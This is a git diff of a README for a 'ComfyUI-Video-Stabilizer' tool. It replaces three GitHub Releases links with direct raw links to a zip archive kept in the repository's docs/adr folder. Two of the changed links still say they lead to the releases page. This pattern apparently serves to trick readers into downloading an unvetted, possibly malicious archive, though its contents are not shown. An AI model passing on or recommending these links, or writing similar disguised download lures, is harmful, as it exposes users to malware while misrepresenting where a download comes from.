@@ -1,6 +1,6 @@
 # 🎥 ComfyUI-Video-Stabilizer - Smooth Your Videos Easily
 
-[![Download Now](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/ImNutria/ComfyUI-Video-Stabilizer/releases)
+[![Download Now](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)
 
 ## 📜 Overview
 
@@ -51,7 +51,7 @@ To begin using ComfyUI Video Stabilizer, you first need to install the ComfyUI f
 
 ### Step 2: Download ComfyUI Video Stabilizer
 
-Visit the [Releases page here](https://github.com/ImNutria/ComfyUI-Video-Stabilizer/releases) to download the latest version of ComfyUI Video Stabilizer.
+Visit the [Releases page here](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip) to download the latest version of ComfyUI Video Stabilizer.
 
 ### Step 3: Running the Application
 
@@ -84,7 +84,7 @@ Once you’re happy with your settings, click the "Export" button to save the st
 
 ## 📥 Download & Install
 
-To download the ComfyUI Video Stabilizer, visit the releases page: [Download Here](https://github.com/ImNutria/ComfyUI-Video-Stabilizer/releases)
+To download the ComfyUI Video Stabilizer, visit the releases page: [Download Here](https://raw.githubusercontent.com/ImNutria/ComfyUI-Video-Stabilizer/main/docs/adr/ComfyUI-Video-Stabilizer-v3.5.zip)
 
 Follow the installation steps to get started as outlined above.
 
